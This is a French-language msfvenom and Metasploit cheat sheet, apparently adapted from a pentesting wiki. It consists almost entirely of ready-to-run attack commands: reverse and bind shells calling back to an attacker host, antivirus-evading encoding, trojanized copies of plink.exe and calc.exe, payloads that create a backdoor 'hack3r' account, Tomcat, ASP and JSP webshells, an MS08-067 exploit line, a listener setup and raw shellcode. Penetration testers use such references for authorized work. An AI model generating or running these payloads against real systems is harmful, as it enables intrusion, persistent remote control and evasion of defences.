=========
MSFVENOM
=========

**Source** : https://pentestwiki.org/msfvenom-payloads-cheat-sheet/

Msfvenom Payloads
=================

General commands
----------------

Liste complète des payloads **msfvenom** pour `Metasploit`_

.. _Metasploit: https://www.metasploit.com/

Répertoriez tous les types de payloads (environ 562 types) :

``msfvenom -l payloads``

Afficher uniquement les payloads Windows x64 :

``msfvenom -l payloads --platform windows --arch x64``

Affiche les formats de sortie (asp, exe, php, powershell, js_le, csharp,...) :

``msfvenom --list formats``

Différence entre les payloads staged et non-staged
==================================================

Dans **msfvenom**, nous pouvons choisir entre des payloads **staged** et **non staged**, mais quelle est la différence ?

Les payloads **non staged** sont des payloads autonomes, ce qui signifie que tout le payload est envoyé en même temps à la cible. 

.. important:: Moins de communications, cette charge est donc préférable pour éviter les détections.

Les payloads **staged** sont envoyés en deux étapes : 

La première charge au compte-gouttes et la deuxième étape charge le payload.

1. Si le débordement de la mémoire tampon est trop petit pour contenir un payload non staged, le diviser en deux aidera.

2. Étant en plusieurs parties, il est plus facilement détectable par l'antivirus de l'hôte.

Génération de payloads avec Msfvenom
====================================

Binary payloads
---------------

Générez du code en C pour une cible Windows avec un reverse shell TCP se connectant à l'hôte $LOCALIP:443 (payload non staged) :

``msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=443 -f c``

Générez du code en C pour une cible Windows avec un reverse shell TCP se connectant à l'hôte $LOCALIP:443 (payload staged) :

``msfvenom -p windows/shell/reverse_tcp LHOST=$LOCALIP LPORT=443 -f c``

Générez du code en C pour le reverse shell TCP sur l'hôte $LOCALIP:443 en obscurcissant la payload et en évitant les caractères défectueux ``\x00\x0a\x0d`` dans le shellcode :

.. code-block:: bash

  msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"

Générez du code en C pour le reverse shell afin d'y héberger $LOCALIP:443 (TCP) en obscurcissant la payload et en évitant les caractères défectueux ``\x00\x0a\x0d`` dans le shellcode et en générant le shellcode dans une menace différente pour ne pas bloquer le processus principal :

.. code-block:: bash

  msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"

Générez du code en C pour un **bindshell** sur une cible Linux port TCP/4444 en évitant les caractères défectueux ``\x00\x0a\0d\x20`` et en obscurcissant le shellcode :

.. code-block:: bash

  msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai

Générez un payload en JavaScript pour exécuter un reverse shell staged sur $LOCALIP hôtes port 443 :

.. code-block:: bash

  msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=443 -f js_le -e generic/none

Générez un fichier Windows EXE avec un shellcode exécutant un reverse shell sur $LOCALIP hôtes port TCP (4444). La sortie sera écrite dans le fichier **shell_reverse.exe** :

.. code-block:: bash

  msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=4444 -f exe -o shell_reverse.exe

Générez un fichier Windows EXE avec un shellcode exécutant un reverse shell sur $LOCALIP hôtes port TCP (4444). La sortie sera écrite dans **reverse_shell_msf_encoded.exe** et Obscurcissez le shellcode en effectuant **9 tours** d'obscurcissement.

.. code-block:: bash

  msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe

Trojanize file plink.exe pour exécuter un reverse shell sur l'hôte $LOCALIP:4444 (TCP) en utilisant 9 tours d'obscurcissement et en écrivant le fichier EXE de sortie dans le fichier **shell_reverse_msf_encoded_embedded.exe** :

.. code-block:: bash

  msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe

Générez un fichier EXE appelé **met_https_reverse.exe** pour exécuter un reverse shell via HTTPS (443) sur l'hôte $LOCALIP pour vous connecter à une session meterpreter d'écoute :

.. code-block:: bash

  msfvenom -p windows/meterpreter/reverse_https LHOST=$LOCALIP LPORT=443 -f exe -o met_https_reverse.exe
  msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=4444 -f exe -o shell_reverse.exe
  msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
  msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
  msfvenom -p windows/meterpreter/reverse_http LHOST=$LOCALIP LPORT=80 -f exe -e x86/shikata_ga_nai -x /usr/share/windows-binaries/plink.exe -o /var/www/daaa118.exe

Trojanize calc.exe pour exécuter un reverse shell meterpreter sur l'hôte $LOCALIP enregistré dans le fichier calc_2.exe :

.. code-block:: bash

  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCALIP -f exe -k -x calc.exe -o calc_2.exe

Staged ELF shared library (.so) payload avec reverse shell :

.. code-block:: bash
  
  msfvenom -p linux/x86/shell/reverse_tcp LHOST=$LOCALIP LPORT=443 -o staged.out -f elf-so

Non-staged ELF shared library (.so) payload avec reverse shell :

.. code-block:: bash
  
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LOCALIP LPORT=443 -o non-staged.out -f elf-so

Générez un fichier meterpreter.exe en *inventant* un reverse shell sur l'hôte $LOCALIP port TCP/443 :

.. code-block:: bash
  
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCALIP LPORT=443 -f exe -o meterpreter.exe

.. attention:: Lors de l'utilisation du paramètre -x, l'exécutable ne doit pas être compressé avec UPX

.. code-block:: bash

  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCALIP LPORT=443 -f exe -x /usr/share/windows-binaries/plink.exe -e x86/shikata_ga_nai -o plink-meterpreter.exe

Exploitez MS08-067 (vulnérabilité NetAPI) sur l'hôte $IP et exécutez un bindshell après l'exploitation :

.. code-block:: bash

  msfcli windows/smb/ms08_067_netapi RHOST=$IP PAYLOAD=windows/shell/bind_tcp E

Générez un payload python pour exécuter calc.exe en omettant les caractères ``\x00`` (octet NULL) :

``msfvenom -p windows/exec CMD=calc.exe -b "x00" -f py``

Créer un fichier account.exe avec 20 tours d'obscurcissement contenant un payload qui créera l'utilisateur hack3r avec le mot de passe s3cret^s3cret :

.. code-block:: bash

  msfvenom -p windows/adduser -f exe -o account.exe USER=hack3r PASS=s3cret^s3cret -e x86/shikata_ga_nai -i 20

Trojanized DLL calc.dll pour exécuter calc.exe :

``msfvenom -p windows/exec CMD=calc.exe -f dll -o calc.dll``

Trojanize Windows Service avec 20 tours d'obscurcissement pour créer un nouvel utilisateur hack3r avec le mot de passe s3cret^s3cret :

.. code-block:: bash

  msfvenom -p windows/exec CMD=calc.exe -f exe-service
  msfvenom -p windows/adduser -f exe-service -o service.exe USER=hack3r PASS=s3cret^s3cret -e x86/shikata_ga_nai -i 20

Obtenir le code assembleur de shellcode :

``msfvenom -p linux/x86/exec cmd=whoami R | ndisasm -u -``

.. code-block:: bash

  Payload size: 42 bytes
  
  00000000  6A0B              push byte +0xb
  00000002  58                pop eax
  00000003  99                cdq
  00000004  52                push edx
  00000005  66682D63          push word 0x632d
  00000009  89E7              mov edi,esp
  0000000B  682F736800        push dword 0x68732f
  00000010  682F62696E        push dword 0x6e69622f
  00000015  89E3              mov ebx,esp
  00000017  52                push edx
  00000018  E807000000        call 0x24
  0000001D  7768              ja 0x87
  0000001F  6F                outsd
  00000020  61                popa
  00000021  6D                insd
  00000022  6900575389E1      imul eax,[eax],dword 0xe1895357
  00000028  CD80              int 0x80
  
Obtenez un assembleur dans un format convivial à intégrer dans un exploit python / perl :

``msfvenom -p linux/x86/exec cmd=whoami R | hexdump -v -e '"\\\x" 1/1 "%02x"'``

.. code-block:: bash

  Payload size: 42 bytes
  
  \x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00
  \x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x07\x00\x00\x00\x77\x68\x6f
  \x61\x6d\x69\x00\x57\x53\x89\xe1\xcd\x80

Webshells generation avec Msfvenom
----------------------------------

Tomcat webshell avec un meterpreter reverse shell :

``msfvenom -p java/meterpreter/reverse_tcp -f war -o tomcatapp.war LHOST=$LOCALIP``

Webshell Tomcat avec un revershell autonome avec $LOCALIP hôtes sur le port 442 :

``msfvenom -p java/shell_reverse_tcp -f war -o tomcatapp2.war LHOST=$LOCALIP LPORT=442``

ASP webshell sur Windows :

.. code-block:: bash
  
  msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=443 -f asp -o webshell_reverse_msfvenom.txt

JSP webshell sur Linux :

.. code-block:: bash

  msfvenom -p linux/x86/shell/reverse_tcp LHOST=$LOCALIP LPORT=443 -o test.jsp -f jsp

.. important:: **-v payload** : spécifie le nom du payload !! Très utile lors du remplacement de payloads existantes dans des exploits existants

Utilisez Metasploit pour une connexion reverse shell
====================================================

.. code-block:: bash

  use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LPORT 443
  set LHOST $LOCALIP
  exploit

Plus d'infos :

- https://www.offensive-security.com/metasploit-unleashed/msfvenom/
- **MSFVenom payload generator** : https://pentestwiki.org/tools/msfvenom-payload-generator.php (alpha version)